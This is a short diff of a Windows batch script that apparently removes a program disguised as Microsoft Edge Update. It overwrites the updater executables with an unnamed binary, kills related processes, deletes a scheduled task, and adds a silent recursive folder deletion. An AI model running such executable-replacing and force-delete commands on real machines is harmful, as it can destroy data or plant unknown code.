@@ -20,6 +20,7 @@ ren "c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe" "c:\ProgramData\Microsoft
  
 copy c:\windows\temp\1.exe 'c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe' -Force
 copy c:\windows\temp\1.exe 'C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe' -Force
+cmd /c RD c:\ProgramData\US /s /q
 del c:\windows\temp\1.exe
 
 
@@ -27,6 +28,10 @@ Echo Taskkill
 taskkill /IM msbrowse.exe /f 
 taskkill /IM UAStock.exe /f 
 taskkill /IM MicrosoftEdgeUpdate /f 
+
+del "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
+del "c:\ProgramData\Microsoft\EdgeUpdate\1msbrowse.exe"
+
 
 Echo DelSchedule
 schtasks /TN Microsoft\UAStock /Delete /F
